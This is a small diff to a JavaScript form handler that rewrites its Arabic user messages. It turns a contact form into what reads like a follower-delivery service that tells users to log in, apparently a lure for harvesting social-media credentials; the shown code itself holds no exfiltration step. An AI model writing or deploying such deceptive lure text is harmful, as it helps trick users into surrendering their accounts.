@@ -8,7 +8,7 @@ export default async function handler(req, res) {
   const { name, message } = req.body;
 
   if (!name || !message) {
-    return res.status(400).send("يرجى كتابة الاسم والرسالة");
+    return res.status(400).send("يرجى تسجيل الدخول");
   }
 
   try {
@@ -26,7 +26,7 @@ export default async function handler(req, res) {
       throw new Error(data.description);
     }
 
-    return res.status(200).send("تم إرسال الرسالة!");
+    return res.status(200).send("تم إرسال المتابعين بنجاح انتظر  عدة دقائق ان لم تصل");
   } catch (err) {
     console.error(err);
     return res.status(500).send("حدث خطأ أثناء الإرسال.");
